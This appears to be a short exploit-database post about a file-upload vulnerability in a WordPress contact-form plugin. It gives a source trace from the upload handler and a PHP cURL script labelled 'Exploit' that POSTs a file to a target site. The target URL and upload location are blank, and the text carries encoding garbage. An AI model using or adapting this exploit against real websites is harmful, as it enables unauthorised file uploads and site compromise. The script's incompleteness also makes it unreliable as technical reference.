[-] Author: mehran feizi
[-] Category: webapps
[-] Date: 2020.02.11

Vulnerable Source:
134: move_uploaded_file move_uploaded_file($file[&#039;tmp_name&#039;], $new_file))
82: $file = $_FILES[$name] : null;
132: $new_file = path_join($uploads_dir, $filename);
122: $uploads_dir = wpcf7_maybe_add_random_dir($uploads_dir);
121: $uploads_dir = wpcf7_upload_tmp_dir();
131: $filename = wp_unique_filename($uploads_dir, $filename);
122: $uploads_dir = wpcf7_maybe_add_random_dir($uploads_dir);
121: $uploads_dir = wpcf7_upload_tmp_dir();
128: $filename = apply_filters(&#039;wpcf7_upload_file_name&#039;, $filename,
$file[&#039;name&#039;], $tag);
126: $filename = wpcf7_antiscript_file_name ($filename);
125: $filename = wpcf7_canonicalize ($filename, &#039;as-is&#039;);
124: $filename = $file[&#039;name&#039;];
82: $file = $_FILES[$name] : null;
82: $file = $_FILES[$name] : null;
78: â‡“ function wpcf7_file_validation_filter($result, $tag)


Exploit:
<?php
$shahab="file.jpg";
$ch = curl_init("
");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array(&#039;zip&#039;=>"@$shahab"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);
print "$result";
?>

Location File:

